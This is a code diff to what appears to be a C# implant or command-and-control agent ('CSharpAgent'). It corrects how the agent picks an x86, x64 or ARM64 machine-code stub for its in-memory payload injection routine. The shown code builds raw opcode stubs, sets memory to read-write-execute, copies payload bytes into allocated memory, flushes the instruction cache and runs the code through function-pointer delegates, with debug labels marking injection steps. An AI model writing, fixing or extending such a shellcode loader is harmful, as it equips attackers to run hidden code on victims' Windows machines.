@@ -13,14 +13,18 @@ namespace CSharpAgent
             // Addresses print as hex (Diag.Hex); the NtAllocateVirtualMemory NTSTATUS is now
             // captured and shown instead of silently discarded.
 
-            // Detect native ARM64 at runtime so the correct execution stub is selected. IntPtr.Size
-            // alone can't separate ARM64 from x64 (both 8), so we also check the system arch.
-            SYSTEM_INFO sysInfo;
-            NativeImports.GetNativeSystemInfo(out sysInfo);
-            bool isArm64 = sysInfo.wProcessorArchitecture == 12 && IntPtr.Size == 8;
+            // The stub's machine code must match THIS PROCESS's native architecture — the
+            // instruction set the process actually executes, not the machine's: on Windows 11
+            // ARM64 an emulated x64 process executes x64 code, and a system-arch probe (the
+            // old logic) handed it the ARM64 stub, dying on garbage instructions. The process
+            // arch is what PROCESSOR_ARCHITECTURE reports (an emulated process sees its
+            // emulation arch; the real machine shows up only in PROCESSOR_ARCHITEW6432,
+            // which we deliberately do NOT consult). Checked BEFORE the IntPtr.Size gates —
+            // native ARM64 and x64 both have 8-byte pointers; the env var separates them.
+            var processArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
 
             byte[] asm;
-            if (isArm64)
+            if (processArch == "ARM64")
                 // mov x0, x18; ret
                 asm = new byte[] { 0xE0, 0x03, 0x12, 0xAA, 0xC0, 0x03, 0x5F, 0xD6 };
             else if (IntPtr.Size == 8)
@@ -31,8 +35,8 @@ namespace CSharpAgent
                 asm = new byte[] { 0x64, 0xA1, 0x18, 0, 0, 0, 0xC3 };
 
 #if DEBUG
-            Diag.Show("[inj 1] arch", (isArm64 ? "ARM64" : IntPtr.Size == 8 ? "x86_64" : "i386") +
-                " — TEB stub " + asm.Length + " bytes, " + bytes.Length + " payload bytes");
+            Diag.Show("[inj 1] arch", (processArch == "ARM64" ? "ARM64" : IntPtr.Size == 8 ? "x86_64" : "i386") +
+                " (process) — TEB stub " + asm.Length + " bytes, " + bytes.Length + " payload bytes");
 #endif
 
             IntPtr ptr = Marshal.AllocHGlobal(asm.Length);
@@ -41,7 +45,7 @@ namespace CSharpAgent
             uint oldProtect;
             NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, 0x40, out oldProtect);
 
-            if (isArm64)
+            if (processArch == "ARM64")
                 NativeImports.FlushInstructionCache(new IntPtr(-1), ptr, (UIntPtr)asm.Length);
 
             var getTEB = (GetTEBDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetTEBDelegate));
@@ -98,7 +102,7 @@ namespace CSharpAgent
 
             Marshal.Copy(bytes, 0, pMemory, bytes.Length);
 
-            if (isArm64)
+            if (processArch == "ARM64")
                 NativeImports.FlushInstructionCache(new IntPtr(-1), pMemory, (UIntPtr)bytes.Length);
 
             IntPtr parametersMemory = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Parameters)));
